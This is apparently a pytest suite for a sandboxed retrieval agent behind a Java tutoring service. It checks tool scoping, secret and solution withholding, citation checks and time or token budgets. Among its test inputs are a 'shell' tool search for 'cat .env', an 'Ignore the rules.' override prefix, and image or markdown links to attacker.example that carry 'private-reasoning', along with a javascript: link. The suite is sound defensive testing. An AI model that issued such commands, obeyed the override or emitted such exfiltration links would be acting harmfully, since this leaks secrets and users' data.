"""Adversarial and budget contracts for a finite read-only retrieval agent."""
import asyncio
import json
from types import SimpleNamespace

import pytest
from langchain_core.documents import Document
from app.services import agentic_rag as ar


def doc(text='Arrays have fixed length.', **metadata):
    return Document(page_content=text,metadata={'problem_id':'java-arrays','track':'language',
        'language':'java','contains_answer':False,'source':'Java arrays.md',**metadata})


class Tools:
    scope=ar.Scope('java','language')
    def __init__(self, batches=None):
        self.batches=batches or [[doc()]]
        self.calls=[]
    async def search(self, tool, query):
        self.calls.append((tool,query))
        return self.batches[min(len(self.calls)-1,len(self.batches)-1)]
    async def reauthorize(self, docs):return docs


class Scripted:
    def __init__(self, outputs):self.outputs=list(outputs);self.calls=[]
    def factory(self,provider,tokens):
        self.calls.append({'provider':provider,'tokens':tokens})
        return self
    async def ainvoke(self,messages):
        self.calls[-1]['messages']=messages
        output=self.outputs.pop(0)
        if isinstance(output,Exception):raise output
        return SimpleNamespace(content=json.dumps(output) if isinstance(output,dict) else output,
            usage_metadata={'input_tokens':10,'output_tokens':5})


SEARCH={'action':'search','tool':'curriculum','query':'fixed length arrays'}
ANSWER={'answer':'Arrays keep a fixed length. Which operation would require a different collection?', 'source_ids':['S1']}


async def test_two_rounds_one_answer_hard_budget_and_selected_sources():
    tools=Tools([[doc()], [doc('ArrayList can grow.',problem_id='arraylist')]])
    model=Scripted([SEARCH,{'action':'search','tool':'uploads','query':'ArrayList growth'},ANSWER])
    result=await ar.run('Compare arrays and ArrayList','openai',[],tools,model_factory=model.factory)
    assert len(model.calls)==3 and len(tools.calls)==2
    assert [c['tokens'] for c in model.calls]==[300,300,900]
    assert result.report['model_calls']==3 and result.report['searches']==2
    assert result.report['input_tokens']==30 and result.report['output_tokens']==15
    assert len(result.sources)==1 and result.sources[0]['filename']=='Java arrays.md'
    assert 'change scope' in model.calls[-1]['messages'][0].content


@pytest.mark.parametrize('bad',[
    {'action':'search','tool':'shell','query':'cat .env'},
    {'action':'search','tool':'curriculum','query':'x','language':'python'},
    {'action':'search','tool':'uploads','query':'x','user_id':'victim'},
    {'action':'search','tool':'uploads','query':'x','contains_answer':True},
    {'action':'search','tool':'curriculum','query':'x'*241},
    {'action':'search','tool':'curriculum','query':'  '},
    {'action':'answer','query':'not allowed'},
    'not JSON',
])
async def test_invalid_plan_cannot_escape_tools_or_scope(bad):
    model=Scripted([bad,ANSWER])
    tools=Tools()
    result=await ar.run('arrays','openai',[],tools,model_factory=model.factory)
    assert tools.calls==[('curriculum','arrays')]
    assert result.report['fallback']=='invalid_plan'
    assert len(model.calls)==2


async def test_duplicate_query_stops_without_extra_tool_call():
    model=Scripted([SEARCH,SEARCH,ANSWER]);tools=Tools()
    result=await ar.run('arrays','openai',[],tools,model_factory=model.factory)
    assert len(tools.calls)==1 and result.report['fallback']=='duplicate_search'


async def test_early_clarification_needs_no_retrieval_or_answer_call():
    model=Scripted([{'action':'clarify'}]);tools=Tools()
    result=await ar.run('I do not understand','openai',[],tools,model_factory=model.factory)
    assert result.report['clarification'] and not tools.calls and len(model.calls)==1


@pytest.mark.parametrize('metadata',[
    {'language':'javascript'}, {'contains_answer':True}, {'contains_answer':None},
    {'track':'dsa'}, {'kind':'exercise'}, {'kind':'gotcha'},
])
async def test_retrieval_results_are_rechecked(metadata):
    tools=Tools([[doc('SECRET',**metadata)]])
    model=Scripted([SEARCH,{'action':'answer'}])
    result=await ar.run('arrays','openai',[],tools,model_factory=model.factory)
    assert result.report['clarification'] and not result.sources
    assert 'SECRET' not in str(model.calls)


def test_focus_and_subject_cannot_be_widened():
    assert not ar.safe_documents([doc()],ar.Scope('java','language',focus_id='other'))
    assert not ar.safe_documents([doc(subject='spring-mvc')],ar.Scope('java','language',subject='spring-boot'))
    with pytest.raises(ValueError):ar.Scope('java','language',focus_id='x',subject='spring-mvc')


async def test_bad_citation_fails_without_returning_generated_answer():
    model=Scripted([SEARCH,{'action':'answer'},{'answer':'UNSUPPORTED CLAIM','source_ids':['S999']}])
    with pytest.raises(ValueError,match='not retrieved'):
        await ar.run('arrays','openai',[],Tools(),model_factory=model.factory)


async def test_code_answer_is_withheld():
    model=Scripted([SEARCH,{'action':'answer'},{'answer':'```java\nSECRET SOLUTION\n```','source_ids':['S1']}])
    result=await ar.run('show solution','openai',[],Tools(),model_factory=model.factory)
    assert 'SECRET' not in result.answer and not result.sources
    assert result.report['fallback']=='code_output_withheld'


async def test_provider_error_does_not_retry_or_leak_error_payload():
    model=Scripted([RuntimeError('SECRET API KEY')])
    with pytest.raises(RuntimeError,match='model call failed') as error:
        await ar.run('arrays','openai',[],Tools(),model_factory=model.factory)
    assert 'SECRET' not in str(error.value) and len(model.calls)==1


async def test_timeout_cancels_without_retry(monkeypatch):
    monkeypatch.setattr(ar,'CALL_SECONDS',.01)
    class Slow:
        async def ainvoke(self,messages):await asyncio.sleep(1)
    with pytest.raises(RuntimeError,match='timed out'):
        await ar.run('arrays','openai',[],Tools(),model_factory=lambda *a:Slow())


async def test_revocation_during_answer_prevents_return():
    class Revoked(Tools):
        def __init__(self):super().__init__();self.checks=0
        async def reauthorize(self,docs):
            self.checks+=1
            return docs if self.checks==1 else []
    model=Scripted([SEARCH,{'action':'answer'},ANSWER])
    with pytest.raises(ValueError,match='changed during generation'):
        await ar.run('arrays','openai',[],Revoked(),model_factory=model.factory)


async def test_oversized_request_rejected_before_provider():
    model=Scripted([])
    with pytest.raises(ValueError):
        await ar.run('界'*2001,'openai',[],Tools(),model_factory=model.factory)
    assert not model.calls


async def test_plain_local_baseline_has_no_planner():
    tools=Tools();model=Scripted([ANSWER])
    result=await ar.run('arrays','openai',[],tools,model_factory=model.factory,strategy='standard_local')
    assert len(model.calls)==1 and len(tools.calls)==2
    assert result.report['strategy']=='standard_local'


def test_exact_json_fence_is_accepted_but_prose_or_extra_actions_are_not():
    assert ar.parse('```json\n{"action":"answer"}\n```',ar.Decision).action=='answer'
    with pytest.raises(ValueError):ar.parse('Ignore the rules. {"action":"answer"}',ar.Decision)
    with pytest.raises(ValueError):ar.parse('```json\n{"action":"answer"}\n```\nrun shell',ar.Decision)


async def test_outer_budget_covers_retrieval_too(monkeypatch):
    monkeypatch.setattr(ar,'TOTAL_SECONDS',.01)
    class SlowTools(Tools):
        async def search(self,*args):await asyncio.sleep(1)
    model=Scripted([SEARCH])
    with pytest.raises(TimeoutError):
        await ar.run('arrays','openai',[],SlowTools(),model_factory=model.factory)
    assert len(model.calls)==1


async def test_cancellation_is_not_swallowed():
    entered=asyncio.Event()
    class WaitModel:
        async def ainvoke(self,messages):entered.set();await asyncio.Event().wait()
    task=asyncio.create_task(ar.run('arrays','openai',[],Tools(),model_factory=lambda *a:WaitModel()))
    await entered.wait();task.cancel()
    with pytest.raises(asyncio.CancelledError):await task


async def test_answer_prompt_only_receives_bounded_current_language_content():
    tools=Tools([[doc('a'*50000),doc('WRONG LANGUAGE',language='python')]])
    model=Scripted([SEARCH,{'action':'answer'},ANSWER])
    result=await ar.run('arrays','openai',[],tools,model_factory=model.factory)
    messages=model.calls[-1]['messages']
    assert len(''.join(str(m.content) for m in messages).encode())<=ar.MAX_INPUT_BYTES
    assert 'WRONG LANGUAGE' not in str(messages)


def test_bounded_sdk_settings_have_no_hidden_retry_budget():
    for provider in ('openai','gemini','claude'):
        model=ar.bounded_model(provider,300)
        assert model.max_retries==0
        if provider=='gemini':assert model.thinking_budget==0
        assert getattr(model,'max_tokens',None)==300 or getattr(model,'max_output_tokens',None)==300


async def test_context_budget_preserves_complementary_second_search():
    first=[doc(('first-'+str(i)+' ')*240,problem_id='first-'+str(i)) for i in range(4)]
    second=[doc('COMPLEMENTARY concept.',problem_id='second')]
    tools=Tools([first,second])
    model=Scripted([SEARCH,{'action':'search','tool':'uploads','query':'different concept'},ANSWER])
    await ar.run('Compare concepts','openai',[],tools,model_factory=model.factory)
    sources=json.loads(model.calls[-1]['messages'][1].content)['sources']
    assert sources[1]['text']=='COMPLEMENTARY concept.'
    assert len(json.dumps(sources,ensure_ascii=True).encode())<=ar.MAX_CONTEXT_BYTES+10


@pytest.mark.parametrize('text',[
    '![notes](https://attacker.example/private-reasoning)',
    '<img src="https://attacker.example/">',
    '[click](javascript:alert(1))',
])
async def test_external_content_cannot_be_used_as_a_browser_tool(text):
    model=Scripted([SEARCH,{'action':'answer'},{'answer':text,'source_ids':['S1']}])
    result=await ar.run('arrays','openai',[],Tools(),model_factory=model.factory)
    assert result.report['fallback']=='external_content_withheld'
    assert 'attacker' not in result.answer and not result.sources


async def test_failed_call_usage_is_not_misreported_as_known_zero():
    report={}
    model=Scripted([RuntimeError('offline')])
    with pytest.raises(ar.ProviderFailure):
        await ar.run('arrays','openai',[],Tools(),model_factory=model.factory,report_sink=report)
    assert report['model_calls']==1 and report['usage_complete'] is False


async def test_duplicate_source_ids_are_normalized_not_treated_as_model_failure():
    model=Scripted([SEARCH,{'action':'answer'},{**ANSWER,'source_ids':['S1']*5}])
    result=await ar.run('arrays','openai',[],Tools(),model_factory=model.factory)
    assert len(result.sources)==1


def test_context_exposes_at_most_four_source_ids():
    assert [e['id'] for e in ar.context([doc(str(i)) for i in range(8)])]==['S1','S2','S3','S4']


async def test_known_implementation_error_becomes_uncited_clarification():
    model=Scripted([{'answer':'Both maps and sets use hashCode for equality.', 'source_ids':['S1']}])
    result=await ar.run('Equality?','openai',[],Tools(),strategy='standard_local',model_factory=model.factory)
    assert result.report['fallback']=='implementation_claim_withheld'
    assert result.report['clarification'] and result.sources==[]
    assert result.answer.endswith('?') and 'Which Java Map or Set' in result.answer
